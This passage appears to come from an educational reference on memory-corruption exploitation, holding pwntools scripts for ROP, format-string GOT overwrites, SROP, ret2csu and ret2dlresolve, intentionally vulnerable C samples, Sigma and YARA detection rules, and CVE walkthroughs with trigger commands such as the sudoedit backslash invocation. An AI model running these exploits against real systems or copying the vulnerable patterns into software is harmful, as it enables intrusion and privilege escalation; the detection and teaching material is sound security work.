ret     = rop1.find_gadget(['ret'])[0]

stage1 = flat(
    b'A' * BUF_TO_CANARY,
    p64(canary),
    b'B' * RBP_TO_RIP,                     # saved RBP — don't care
    p64(pop_rdi), p64(elf.got['puts']),
    p64(elf.plt['puts']),                   # puts(puts@GOT) → libc leak
    p64(elf.symbols['main']),               # loop back for stage 2
)
io.sendlineafter(b'> ', stage1)

leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.info(f'libc   : {hex(libc.address)}')

# ── Step 5: ROP → system("/bin/sh") ───────────────────────────
stage2 = flat(
    b'A' * BUF_TO_CANARY,
    p64(canary),
    b'B' * RBP_TO_RIP,
    p64(ret),                               # 16-byte stack alignment
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(libc.symbols['system']),
)
io.sendlineafter(b'> ', stage2)
io.interactive()
```

### 11A.2 Remote vs local exploitation differences

| Concern | Local | Remote |
|---|---|---|
| Libc version | Known (`ldd ./vuln`) | Must fingerprint: leak multiple GOT entries, compare offsets against libc-database |
| Core dumps | Available (`ulimit -c unlimited`) | Unavailable — blind offset finding via crash/no-crash oracle |
| ASLR entropy | Per-exec; disable with `echo 0 > /proc/sys/kernel/randomize_va_space` for dev | Full entropy; must leak every run |
| Timing | Negligible | Network latency; `io.recvline()` may need generous timeout |
| Forking servers | Canary + ASLR bases persist across connections (BROP) | Same advantage, but rate-limiting / connection limits apply |
| Debugging | Attach GDB: `gdb -p $(pidof vuln)` | No debugger; instrument locally with identical libc, then replay remote |

**ASLR bypass via information leak.** Every ASLR bypass in user-space follows the same pattern: (1) obtain a pointer to a known symbol in a known mapping, (2) subtract the symbol's file offset to recover the mapping base. Leak sources: format string `%p`, partial overwrite of a pointer already on the stack, `write()`/`puts()` in a ROP stage, or a side-channel (timing, cache). Without a leak, ASLR on x86_64 provides 28+ bits of entropy for mmap — brute-force is infeasible except in 32-bit or forking-server scenarios.

### 11A.3 PIE bypass techniques

1. **Partial overwrite.** If the overflow only reaches the low 1-2 bytes of a code pointer, overwrite them to redirect within the same page/segment. PIE randomizes the upper bits; the low 12 bits (page offset) are fixed. A 1.5-byte overwrite (12 bits known + 4 bits brute = 1/16 chance) is feasible.

2. **Information leak.** Leak any `.text` pointer (e.g., return address on stack via format string), subtract its offset → PIE base.

3. **Forking server.** PIE base is constant after `fork`. Byte-by-byte return-address brute-force (analogous to canary brute in §2.4): max `6 × 256 = 1536` connections.

4. **vsyscall page.** The legacy vsyscall page at `0xffffffffff600000` is not randomized. Contains `syscall; ret` gadgets. Useful as a known `ret` gadget to defeat stack alignment issues without leaking PIE.

---

## 11B. Format string arbitrary write

### 11B.1 `%n` write to GOT entry — complete exploit

```python
#!/usr/bin/env python3
"""Format string → GOT overwrite → RCE. Partial RELRO assumed."""
from pwn import *

context.binary = elf = ELF('./vuln_fmt')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
OFFSET = 6   # format string input offset on stack

# ── Stage 1: leak libc ────────────────────────────────────────
io = process(elf.path)
io.sendline(b'%3$p')                       # __libc_start_main ret addr
leak = int(io.recvline().strip(), 16)
libc.address = leak - (libc.symbols['__libc_start_main'] + 243)
log.info(f'libc: {hex(libc.address)}')

# ── Stage 2: overwrite puts@GOT → system ─────────────────────
# fmtstr_payload(offset, {addr: value}, numbwritten, write_size)
payload = fmtstr_payload(OFFSET,
    {elf.got['puts']: libc.symbols['system']},
    numbwritten=0,
    write_size='short')   # %hn — 2-byte writes, shorter payload
io.sendline(payload)

# ── Stage 3: trigger — next puts() call executes system() ────
io.sendline(b'/bin/sh')                    # passed to puts → system("/bin/sh")
io.interactive()
```

### 11B.2 `fmtstr_payload` helper internals

`fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')` builds the format string automatically:

- `offset` — stack position where the format string buffer appears.
- `writes` — `{target_addr: value}` dict.
- `write_size` — `'byte'` (`%hhn`, 1-byte writes, longest string), `'short'` (`%hn`, 2-byte), or `'int'` (`%n`, 4-byte, shortest string but largest padding).
- `numbwritten` — bytes already printed before this payload (e.g., a prompt prefix).

On x86_64, addresses contain NUL bytes. `fmtstr_payload` places them **after** the format specifiers so NULs don't terminate the string early.

### 11B.3 Manual write-what-where primitive

```python
def write_short(io, where, value, offset):
    """Write a 2-byte value to 'where' using %hn at 'offset'."""
    # Pad output to match the target short value
    printed = value & 0xffff
    if printed == 0:
        printed = 0x10000            # %65536c → wraps to 0
    fmt  = f'%{printed}c%{offset}$hn'.encode()
    fmt  = fmt.ljust(offset * 8 - 8, b'X')   # align so addr sits at 'offset'
    fmt += p64(where)
    io.sendline(fmt)

# Write 8-byte value as four shorts
def write_qword(io, where, value, base_offset):
    for i in range(4):
        short_val = (value >> (16 * i)) & 0xffff
        write_short(io, where + 2 * i, short_val, base_offset + i)
```

### 11B.4 Hook overwrites (glibc < 2.34)

Before glibc 2.34, `__malloc_hook`, `__free_hook`, and `__realloc_hook` were writable function pointers called on every `malloc`/`free`/`realloc`. Overwriting them was the canonical one-shot path from arbitrary write to RCE:

```python
# Overwrite __free_hook → system (glibc < 2.34 only)
payload = fmtstr_payload(OFFSET,
    {libc.symbols['__free_hook']: libc.symbols['system']})
io.sendline(payload)
io.sendline(b'/bin/sh')   # free("/bin/sh") → system("/bin/sh")
```

glibc 2.34+ removed these hooks. Post-2.34 targets: `__libc_atexit`, `_IO_list_all` (FSOP), `.fini_array`, or GOT entries.

### 11B.5 `.fini_array` overwrite for post-main execution

`.fini_array` contains function pointers called by `__libc_csu_fini` after `main` returns. With Partial RELRO, this section is writable:

```python
# Overwrite .fini_array[0] → redirect execution after main returns
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
payload = fmtstr_payload(OFFSET, {fini_array: elf.symbols['vuln_func']})
# vuln_func runs again after main → enables multi-stage exploitation
```

### 11B.6 RELRO bypass analysis

| RELRO Level | GOT Writable | `.fini_array` Writable | Bypass Strategy |
|---|---|---|---|
| None | Yes | Yes | Direct GOT or `.fini_array` overwrite |
| Partial | `.got.plt` yes, `.got` no | Yes (usually) | Overwrite `.got.plt` entries (lazy-bound) or `.fini_array` |
| Full | No (mapped `PROT_READ`) | No | GOT/fini_array writes fail. Target: libc hooks (< 2.34), `_IO_list_all` (FSOP), `.bss` function pointers, `ld.so` structures (`link_map`), or return addresses on stack |

Full RELRO + glibc ≥ 2.34 eliminates the easiest write targets. Format string exploits must then either (a) write a ROP chain onto the stack via repeated `%n` writes, or (b) corrupt `_IO_FILE` structures for FSOP (cross-reference Domain 3 Chapter 3B for heap-based FSOP).

---

## 11C. Integer overflow exploitation

### 11C.1 Heap overflow via size calculation wrap

```c
/* CVE-pattern: unsigned wraparound → undersized allocation → heap overflow */
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define HDR_SIZE 64

struct packet {
    uint32_t data_len;   /* attacker-controlled */
    char     data[];
};

void process_packet(const char *raw, uint32_t raw_len) {
    struct packet *pkt = (struct packet *)raw;

    /* Vulnerable: HDR_SIZE + pkt->data_len wraps on uint32_t */
    uint32_t total = HDR_SIZE + pkt->data_len;    /* 64 + 0xFFFFFFC0 = 0x24 */
    char *buf = malloc(total);                     /* malloc(0x24) = 36 bytes */
    if (!buf) return;

    memcpy(buf, raw, HDR_SIZE);                    /* safe: 64 ≤ 36? NO → overflow */
    memcpy(buf + HDR_SIZE, pkt->data, pkt->data_len);  /* massive overflow */
}
/* Fix: use __builtin_add_overflow or check (total < HDR_SIZE) after addition */
```

### 11C.2 Signedness bug: negative index → OOB access

```c
/* Attacker supplies index as signed int; code uses it as array subscript */
int read_entry(int32_t index, uint64_t *table, int table_size) {
    if (index >= table_size)            /* negative index passes this check */
        return -1;
    return table[index];                /* table[-N] reads before the array */
}
/* Exploitation: leak stack/heap data at negative offsets, or overwrite
   if a write variant exists.  Fix: declare index as size_t or add >= 0 check */
```

### 11C.3 Truncation bypass of length check

```c
/* 64-bit length checked, then truncated to 32-bit for allocation */
void alloc_and_read(int fd, uint64_t requested) {
    if (requested > MAX_ALLOC)          /* check passes for 0x100000010 */
        return;
    uint32_t size = (uint32_t)requested; /* truncated to 0x10 */
    char *buf = malloc(size);
    read(fd, buf, requested);            /* reads 0x100000010 bytes → overflow */
}
/* Fix: keep a single width throughout; use size_t everywhere */
```

### 11C.4 CVE-2021-22555 walkthrough — Netfilter `setsockopt` integer issue

**Root cause.** `xt_compat_target_from_user` in Netfilter copied user data with a size derived from a 32-bit field without adequate validation. A crafted `IPT_SO_SET_REPLACE` setsockopt could produce a negative offset treated as a large unsigned value, causing a heap OOB write.

**Exploitation chain.** (1) Trigger the integer error to corrupt a `msg_msg` structure on the SLUB heap. (2) Use `MSG_COPY` to leak kernel addresses (KASLR bypass). (3) Overwrite `msg_msg.m_list.next` to achieve arbitrary kernel read/write. (4) Overwrite `modprobe_path` → root.

```python
# Simplified trigger (PoC concept — actual exploit uses raw sockets)
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
# Craft IPT_REPLACE with entries causing negative target_offset
# Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/
```

### 11C.5 Common vulnerable patterns

| Pattern | Root Cause | Typical Impact | Fix |
|---|---|---|---|
| `malloc(a + b)` without overflow check | Unsigned wrap → small alloc | Heap overflow | `__builtin_add_overflow` |
| `int len; if (len > MAX) return; memcpy(dst, src, len)` | Signed → `size_t` promotion | Massive copy → stack/heap overflow | Use `size_t` for lengths |
| `uint16_t size = user_u32;` | Truncation | Undersized alloc or wrong bounds | Match widths |
| `for (int i = 0; i < count; i++) total += sizes[i];` | Repeated addition wraps | Sum underflows → small alloc | Check after each add, or use `__builtin_add_overflow` |
| `alloc(nmemb * size)` | Multiply overflow | Undersized alloc | Use `calloc` (checks internally) or `__builtin_mul_overflow` |
| `if (offset + len < buf_size)` | Addition wraps past `buf_size` | OOB read/write | Check `offset < buf_size && len <= buf_size - offset` |

---

## 11D. FORTIFY_SOURCE bypass

### 11D.1 Where FORTIFY does not protect

`FORTIFY_SOURCE` only inserts checks when the compiler can determine the destination buffer size at compile time (levels 1-2) or via limited dynamic analysis (level 3). It does not protect:

1. **Heap objects whose size is unknown at compile time.** `char *p = malloc(n); strcpy(p, src);` — `__builtin_object_size(p, 0)` returns `(size_t)-1` (unknown) at levels 1-2, so the `_chk` variant falls back to the unfortified function.

2. **Partial overwrites within buffer bounds.** If the overflow stays within the compiler-known object size but corrupts adjacent struct fields, FORTIFY sees no violation.

3. **Custom memory management.** Arena allocators, pool allocators, `mmap`-backed buffers — the compiler cannot track their sizes.

4. **`%n` in read-only format strings.** `__printf_chk` only blocks `%n` when the format string is in writable memory. A format string in `.rodata` (constant) is trusted — the programmer put it there intentionally.

### 11D.2 Partial overwrite within bounds

```c
struct session {
    char username[64];    /* buffer size known to compiler: 64 */
    int  is_admin;        /* adjacent field */
};

void set_username(struct session *s, const char *input) {
    /* FORTIFY level 1: __builtin_object_size(s->username, 0) = sizeof(struct session)
       → the WHOLE struct, not just username[64].
       A 68-byte strcpy does not trigger the _chk abort. */
    strcpy(s->username, input);   /* 68 bytes overwrites is_admin */
}
/* Level 2 uses narrowest subobject → would detect this (size = 64).
   Level 1 does not. Many distros default to level 2 now. */
```

### 11D.3 `_FORTIFY_SOURCE=3` (GCC 12+ / Clang 14+)

Level 3 uses `__builtin_dynamic_object_size`, which can track sizes through `malloc` return values and pointer arithmetic in some cases:

```c
char *p = malloc(n);
/* Level 2: __builtin_object_size(p, 0) = (size_t)-1 (unknown) → no check */
/* Level 3: __builtin_dynamic_object_size(p, 0) = n → inserts runtime check */
strcpy(p, src);  /* __strcpy_chk(p, src, n) at level 3 */
```

Limitations at level 3: optimizer must see the `malloc` and the use in the same compilation unit; LTO improves coverage. Complex pointer arithmetic or aliasing defeats tracking.

---

## 11E. Advanced stack exploitation

### 11E.1 Stack pivoting

When the overflowed buffer is too small for a full ROP chain, pivot `RSP` to attacker-controlled memory (heap, `.bss`, large buffer elsewhere).

**Common gadgets:**

```asm
; leave ; ret  →  mov rsp, rbp ; pop rbp ; ret
; Requires: overflow sets saved RBP to (pivot_target - 8)
; After leave: RSP = pivot_target, RBP = [pivot_target]
; After ret: RIP = [pivot_target + 8]

; xchg <reg>, rsp ; ret
; If attacker controls <reg> (e.g., RAX from return value), RSP swaps to it

; pop rsp ; ret
; Direct RSP load from stack — rare but powerful
```

```python
# pwntools — stack pivot via saved RBP overwrite
pivot_buf = elf.bss() + 0x800          # writable, large region
# Write ROP chain to pivot_buf first (via format string or read)
rop_chain = flat(
    p64(pop_rdi), p64(binsh), p64(system)
)
# ... write rop_chain to pivot_buf ...

# Overflow: set saved RBP = pivot_buf, return to 'leave; ret' gadget
payload = flat(
    b'A' * BUF_TO_RBP,
    p64(pivot_buf),                     # new RBP → pivot target
    p64(leave_ret),                     # gadget: leave; ret
)
```

### 11E.2 Sigreturn-oriented programming (SROP)

`sigreturn` restores **all** registers from a `sigframe` structure on the stack. If the attacker controls the stack, they craft a fake `sigframe` to set `RIP`, `RSP`, `RDI`, etc. to arbitrary values — a single syscall replaces an entire ROP chain.

```python
from pwn import *
context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = constants.SYS_execve     # 59
frame.rdi = binsh_addr               # pointer to "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret              # syscall; ret gadget
frame.rsp = stack_addr               # valid stack for after execve

# Payload: overflow → set RAX=15 (SYS_rt_sigreturn) → syscall → sigframe
payload = flat(
    b'A' * offset,
    p64(pop_rax),         # gadget: pop rax; ret
    p64(15),              # SYS_rt_sigreturn
    p64(syscall_ret),     # triggers sigreturn
    bytes(frame),         # fake sigframe — 248 bytes on x86_64
)
```

Requirements: a `syscall; ret` gadget and a way to set `RAX = 15`. Minimal gadget set compared to conventional ROP.

### 11E.3 ret2csu (`__libc_csu_init` gadgets)

Nearly every non-PIE ELF linked with glibc contains `__libc_csu_init`, which provides two useful gadgets:

```asm
; Gadget 1 (pop sequence):
;   pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

; Gadget 2 (call sequence):
;   mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call [r15 + rbx*8]
;   add rbx, 1 ; cmp rbp, rbx ; jne <gadget2>
;   [falls through to gadget 1 pops] → ret

; Usage: set rbx=0, rbp=1, r12=arg1, r13=arg2, r14=arg3,
;        r15=ptr to function pointer → calls func(arg1, arg2, arg3)
```

```python
csu_pop   = elf.symbols['__libc_csu_init'] + 0x5a  # adjust per binary
csu_call  = elf.symbols['__libc_csu_init'] + 0x40

def ret2csu(func_ptr, arg1, arg2, arg3):
    return flat(
        p64(csu_pop),
        p64(0),           # rbx = 0
        p64(1),           # rbp = 1 (loop exits after one call)
        p64(arg1),        # r12 → edi
        p64(arg2),        # r13 → rsi
        p64(arg3),        # r14 → rdx
        p64(func_ptr),    # r15 → call [r15 + 0*8]
        p64(csu_call),
        b'\x00' * 56,     # 7 pops after the call (padding)
    )
```

### 11E.4 ret2dlresolve

Force the dynamic linker to resolve an arbitrary symbol (e.g., `system`) by crafting fake `Elf64_Sym` + `Elf64_Rela` + symbol name on the stack or a writable segment, then jumping to the PLT stub with a crafted relocation index.

```python
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)          # read fake structures into .bss
rop.ret2dlresolve(dlresolve)              # trigger resolution
payload = flat(b'A' * offset, rop.chain())
io = process(elf.path)
io.sendline(payload)
io.send(dlresolve.payload)                # fake Sym/Rela/name
io.interactive()
```

Advantage: no libc leak required. Works against Full RELRO only if you can also overwrite `link_map` — practically, Partial RELRO is required.

### 11E.5 One-gadget constraints

`one_gadget` searches libc for single-instruction-sequence paths to `execve("/bin/sh", NULL, NULL)`. Each gadget has register/stack constraints:

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
  constraints: rsp & 0xf == 0, rcx == NULL, rbp == NULL || ...
0xe3b01 execve("/bin/sh", r15, rdx)
  constraints: [r15] == NULL || r15 == NULL, [rdx] == NULL || rdx == NULL
```

If constraints are not naturally satisfied, prepend gadgets to zero the required registers (`xor edx, edx; ret`, `xor r15d, r15d; ret`). When calling via `__free_hook` or `__malloc_hook`, the register state at the hook call site determines which one-gadget works.

---

## 11F. Detection engineering

### 11F.1 Sigma rules

```yaml
# 1. Stack smashing detected in syslog
title: Stack Smashing Detected
id: a1b2c3d4-0001-4000-a000-000000000001
status: stable
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - message|contains: 'stack smashing detected'
        - message|contains: '__stack_chk_fail'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1203

# 2. Format string crash pattern
title: Format String Exploitation Crash
id: a1b2c3d4-0002-4000-a000-000000000002
status: experimental
logsource:
    product: linux
    service: syslog
detection:
    segfault:
        message|contains: 'segfault'
    fmt_indicator:
        - message|re: 'ip [0-9a-f]+ sp [0-9a-f]+ error 4'   # read fault (SIGSEGV from %s dereference)
        - message|contains: 'in libc'
    condition: segfault and fmt_indicator
level: medium

# 3. Integer overflow crash (UBSAN / SIGFPE)
title: Integer Overflow Runtime Detection
id: a1b2c3d4-0003-4000-a000-000000000003
status: experimental
logsource:
    product: linux
    service: syslog
detection:
    selection:
        - message|contains: 'runtime error: signed integer overflow'
        - message|contains: 'runtime error: unsigned integer overflow'
        - message|contains: 'runtime error: negation of'
        - message|contains: 'SIGFPE'
    condition: selection
level: medium
tags:
    - attack.initial_access
```

### 11F.2 YARA rules

```yara
rule Format_String_Exploit_Payload {
    meta:
        description = "Detect format string exploit payloads in network captures or files"
        author = "3A detection"
    strings:
        $pct_n     = "%n"  ascii
        $pct_hn    = "%hn" ascii
        $pct_hhn   = "%hhn" ascii
        $positional = /\%[0-9]{1,3}\$n/ ascii
        $pos_hn     = /\%[0-9]{1,3}\$hn/ ascii
        $large_pad  = /\%[0-9]{4,6}c/ ascii     // large padding before %n
    condition:
        (any of ($pct_n, $pct_hn, $pct_hhn)) and
        (any of ($positional, $pos_hn)) and
        $large_pad
}

rule ROP_Chain_In_Payload {
    meta:
        description = "Detect ROP chain patterns — sequences of 8-byte aligned addresses"
    strings:
        $pop_rdi = { 5f c3 }                 // pop rdi; ret
        $pop_rsi = { 5e c3 }                 // pop rsi; ret
        $pop_rdx = { 5a c3 }                 // pop rdx; ret
        $syscall = { 0f 05 c3 }              // syscall; ret
        $leave_ret = { c9 c3 }               // leave; ret
        $bin_sh  = "/bin/sh" ascii
    condition:
        3 of ($pop_rdi, $pop_rsi, $pop_rdx, $syscall, $leave_ret) and
        $bin_sh
}

rule Stack_Pivot_Gadget_Sequence {
    meta:
        description = "Detect stack pivot gadgets in executable sections"
    strings:
        $xchg_rax_rsp = { 48 94 c3 }         // xchg rax, rsp; ret
        $xchg_rcx_rsp = { 48 87 e1 c3 }      // xchg rcx, rsp; ret
        $pop_rsp      = { 5c c3 }             // pop rsp; ret
        $leave_ret    = { c9 c3 }             // leave; ret
        $mov_rsp_rbp  = { 48 89 ec c3 }       // mov rsp, rbp; ret
    condition:
        any of them
}
```

### 11F.3 AddressSanitizer / UBSan in CI/CD

```bash
# Build with ASAN + UBSAN for CI testing
export CFLAGS="-fsanitize=address,undefined -fno-sanitize-recover=all -g -O1"
export LDFLAGS="-fsanitize=address,undefined"
make clean && make

# Run test suite — ASAN aborts on first OOB/UAF/overflow
./run_tests

# For fuzzing integration (AFL++ + ASAN):
CC=afl-clang-fast CFLAGS="-fsanitize=address" make
afl-fuzz -i corpus/ -o findings/ -- ./binary @@

# UBSan integer overflow checks (separate build for performance):
CFLAGS="-fsanitize=integer -fno-sanitize-recover=integer" make
./run_tests   # traps on any integer overflow/truncation
```

**CI integration pattern:** run ASAN/UBSAN builds as a separate CI job. They are 2-3x slower and use 3-5x memory. Do not gate release builds on sanitizer instrumentation — use them for test/fuzz builds only.

### 11F.4 Crash analysis automation

```bash
# Enable persistent core dumps via systemd-coredump
# /etc/systemd/coredump.conf:
#   Storage=external
#   Compress=yes
#   MaxUse=2G

# List recent crashes
coredumpctl list

# Analyze a specific crash
coredumpctl debug <PID>       # opens in GDB
coredumpctl info <PID>        # metadata: signal, registers, maps

# ABRT (Automated Bug Reporting Tool) integration:
# /etc/abrt/abrt-action-save-package-data.conf
# ProcessUnpackaged = yes     # catch crashes from non-packaged binaries
abrt-cli list                 # list recent crashes
abrt-cli info <CRASH_DIR>     # detailed crash info with backtrace
```

---

## 11G. CVE reference table

| CVE | Year | Software | Vulnerability Class | Root Cause | Impact |
|---|---|---|---|---|---|
| CVE-2012-0809 | 2012 | sudo ≤ 1.8.3 | Format string | User-supplied `argv[0]` passed to `sudo_debug()` as format string | Local root |
| CVE-2020-1938 | 2020 | Apache Tomcat AJP (Ghostcat) | Protocol design flaw (file read/inclusion) | AJP connector allows setting `javax.servlet.include.*` attributes → arbitrary file read on server | Remote file read → RCE via JSP upload |
| CVE-2012-3569 | 2012 | VMware OVF Tool | Format string | User-controlled OVF metadata passed to `printf`-family function | Remote code execution |
| CVE-2023-4911 | 2023 | glibc ld.so (Looney Tunables) | Stack buffer overflow | `GLIBC_TUNABLES` env var processing in dynamic linker; unbounded copy into fixed stack buffer | Local root (SUID binaries) |
| CVE-2021-44228 | 2021 | Apache Log4j (Log4Shell) | JNDI injection | `${jndi:ldap://...}` in log messages triggers JNDI lookup; not a stack overflow per se, but triggers native deserialization code paths | Remote code execution |
| CVE-2003-0466 | 2003 | WU-FTPD | Stack buffer overflow | `realpath()` overflow via crafted path | Remote root |
| CVE-2023-6246 | 2024 | glibc `__vsyslog_internal` | Stack buffer overflow | Heap-to-stack buffer overflow in syslog processing | Local root |
| CVE-2021-22555 | 2021 | Linux Netfilter | Integer error → heap OOB write | `xt_compat_target_from_user` size miscalculation (signed/unsigned) | Local root (container escape) |
| CVE-2014-0160 | 2014 | OpenSSL (Heartbleed) | Missing bounds check on integer length field | TLS heartbeat `payload_length` not validated against actual payload → OOB read | Remote memory disclosure (up to 64 KB per request) |
| CVE-2013-2094 | 2013 | Linux kernel (perf) | Signedness confusion | `int` event ID sign-extended to `u64` → negative array index | Local root |
| CVE-2015-7547 | 2016 | glibc `getaddrinfo` | Stack buffer overflow | DNS response buffer too small for large replies; stack-based buffer overflowed | Remote code execution |
| CVE-2021-3156 | 2021 | sudo (Baron Samedit) | Heap overflow from integer error | Off-by-one in backslash handling → heap overflow via `sudoedit -s` | Local root |
| CVE-2019-11477 | 2019 | Linux kernel TCP (SACK Panic) | Integer overflow | `tcp_gso_segs` overflow via crafted SACK → kernel panic | Remote DoS |
| CVE-2009-1385 | 2009 | Linux kernel (e1000e) | Integer underflow | Frame size underflow in driver → kernel heap overflow | Remote code execution |

**Companion mapping.** Format string: CVE-2012-0809, CVE-2012-3569. Stack overflow: CVE-2023-4911, CVE-2003-0466, CVE-2023-6246, CVE-2015-7547. Integer error: CVE-2021-22555, CVE-2014-0160, CVE-2013-2094, CVE-2021-3156, CVE-2019-11477, CVE-2009-1385. Protocol/design flaw (included for cross-reference completeness): CVE-2020-1938, CVE-2021-44228.

---

## 12. Stack / Format / Integer CVE walkthroughs

The CVE reference table in §11G provides one-line summaries. This section dissects four high-impact CVEs in depth: vulnerable code path, exploitation chain, detection artifacts, and patch analysis.

### 12.1 CVE-2023-4911 — Looney Tunables (glibc GCONV_PATH stack buffer overflow)

**Affected versions:** glibc 2.34 through 2.38 (commit `2ed18c`, April 2021).

**Root cause.** The dynamic linker `ld.so` processes the `GLIBC_TUNABLES` environment variable during early startup, before `main()` is reached. The function `__tunables_init()` copies tunable strings into a fixed-size stack buffer. When multiple `GLIBC_TUNABLES` entries are provided, a parsing loop in `tunables_strdup()` fails to account for the cumulative length of chained tunable values. The loop processes each `key=value` pair and appends it to the destination buffer without re-checking the remaining capacity after each iteration.

```c
/* Simplified view of the vulnerable code path in elf/dl-tunables.c */
static void
__tunables_init(char **envp)
{
    char buf[TUNABLE_MAX_LEN];   /* Fixed 1024-byte stack buffer */
    /* ... */
    for (char *p = valp; *p != '\0'; )
    {
        /* Parse key=value pairs separated by ':' */
        char *end = strchr(p, ':');
        /* Copy into buf — NO bounds check against remaining space */
        memcpy(dest, p, len);
        dest += len;
        /* ... */
    }
}
```

The critical detail: `TUNABLE_MAX_LEN` is a compile-time constant (typically 1024 bytes). The attacker supplies `GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=...` with a total length exceeding 1024 bytes. Since the environment is processed before any SUID-dropping logic, this overflow occurs in SUID binaries with full root privileges.

**Exploitation chain.**

1. **Trigger the overflow.** Set `GLIBC_TUNABLES` to a crafted string that overflows past `buf[]` into the saved frame pointer and return address.

2. **Bypass stack canary.** The overflow occurs during `ld.so` initialization, before the main program's canary check. The dynamic linker uses a separate canary that can be deterministically predicted because `AT_RANDOM` is available from the auxiliary vector, and `ld.so` does not re-randomize its canary independently.

3. **Control instruction pointer.** The return address of `__tunables_init()` is overwritten. The attacker redirects execution to a controlled location.

4. **ROP chain for privilege escalation.** Since this targets SUID binaries, the attacker chains gadgets from `ld.so` itself (which is mapped at a predictable offset relative to the overflowed buffer on systems without full ASLR entropy for the linker). The chain calls `execve("/bin/sh", NULL, NULL)`.

```bash
# Detection: look for abnormally long GLIBC_TUNABLES in process environment
# This systemtap script fires on execve with suspicious tunable length
stap -e '
probe syscall.execve {
    envp = @cast(pointer_arg(3), "char **")
    for (i = 0; i < 256; i++) {
        env = user_string(envp[i])
        if (env == "") break
        if (isinstr(env, "GLIBC_TUNABLES") && strlen(env) > 512)
            printf("SUSPICIOUS: pid=%d comm=%s GLIBC_TUNABLES len=%d\n",
                   pid(), execname(), strlen(env))
    }
}'

# File-based detection: audit /proc/*/environ for running processes
for pid in /proc/[0-9]*/environ; do
    tr '\0' '\n' < "$pid" 2>/dev/null | \
        awk -v pid="$pid" '/^GLIBC_TUNABLES=/ && length > 512 {
            print "ALERT: " pid " tunable length=" length
        }'
done
```

**Patch analysis.** The fix (glibc commit `750a45a`, October 2023) adds a bounds check inside the parsing loop that compares `dest - buf` against `TUNABLE_MAX_LEN` before each copy operation. Additionally, glibc 2.39+ strips `GLIBC_TUNABLES` from the environment for SUID/SGID binaries during `__tunables_init()`, matching the treatment already applied to `LD_PRELOAD` and `LD_LIBRARY_PATH`.

### 12.2 CVE-2021-3156 — Baron Samedit (sudo integer/off-by-one → heap overflow)

**Affected versions:** sudo 1.8.2 through 1.9.5p1 (January 2011 to January 2021 — nearly ten years undetected).

**Root cause.** This is a heap-based buffer overflow, but its trigger mechanism is an integer/off-by-one error in backslash escape processing — squarely within this chapter's §6 territory. When `sudoedit -s` (or `sudo -s`) is invoked, sudo copies command-line arguments into a heap buffer, escaping special characters with backslashes. The function `set_cmnd()` in `plugins/sudoers/sudoers.c` calculates the required buffer size by counting characters that need escaping. An off-by-one error in the backslash-counting logic causes the allocated buffer to be one byte too small when the input ends with a single unescaped backslash.

```c
/* Simplified vulnerable code in set_cmnd() */
/* Phase 1: calculate size */
size = 0;
for (av = NewArgv + 1; *av; av++)
    size += strlen(*av) + 1;  /* +1 for space or NUL */

/* Phase 2: copy with escaping — the bug is HERE */
for (src = *av; (c = *src) != '\0'; src++) {
    if (c == '\\' && !isspace((unsigned char)src[1])) {
        /* Escape the backslash */
        *dst++ = '\\';
        *dst++ = c;
        /* BUT: when src[1] == '\0' (end of string), the loop
           advances past the NUL terminator, reading into the
           next argument's memory. The size calculation in Phase 1
           did not account for the extra backslash byte. */
    }
}
```

The off-by-one manifests because the size calculation does not account for the extra byte consumed when a trailing backslash is followed by a non-space character (including NUL). The copy loop writes one more byte than was allocated, producing a classic heap overflow.

**Exploitation chain.**

1. **Trigger.** Invoke `sudoedit -s '\' $(python3 -c 'print("A"*N)')` where the trailing backslash causes the off-by-one.

2. **Heap grooming.** The overflowed byte corrupts the `size` field of the adjacent heap chunk. Three independent exploitation paths were published:
   - Overwrite `service_user` struct in `nss` to hijack `NSS_SVC_` function dispatch.
   - Corrupt `def_timestampdir` to gain arbitrary file write via timestamp directory.
   - Overwrite `user_args` to inject a controlled string into log processing.

3. **Privilege escalation.** All three paths lead to code execution as root because sudo runs as SUID root.

```bash
# Detection: attempt to trigger the vulnerable code path (safe — exits before overflow)
sudoedit -s '\' '' 2>&1 | grep -q "usage:" && echo "PATCHED" || echo "VULNERABLE"

# Runtime detection: audit rule for sudoedit with backslash arguments
# /etc/audit/rules.d/baron-samedit.rules
-a always,exit -F path=/usr/bin/sudoedit -F key=baron_samedit
-a always,exit -F path=/usr/bin/sudo -F a0="-s" -F key=baron_samedit

# Search for exploitation artifacts in sudo logs
grep -E 'sudoedit.*\\\\' /var/log/auth.log /var/log/secure 2>/dev/null
```

**Patch analysis.** The fix (sudo 1.9.5p2, January 2021) modifies `set_cmnd()` to properly account for the trailing backslash case in the size calculation. The patched code adds `size++` when a backslash is found at the end of an argument (i.e., `src[1] == '\0'`). Additionally, sudo 1.9.5p2 adds a bounds check in the copy loop that verifies `dst < dst_end` before each write.

### 12.3 CVE-2022-27666 — esp6 kernel stack buffer overflow

**Affected versions:** Linux kernel 2.6.x through 5.17-rc7 (specifically the IPsec `esp6` module, `net/ipv6/esp6.c`).

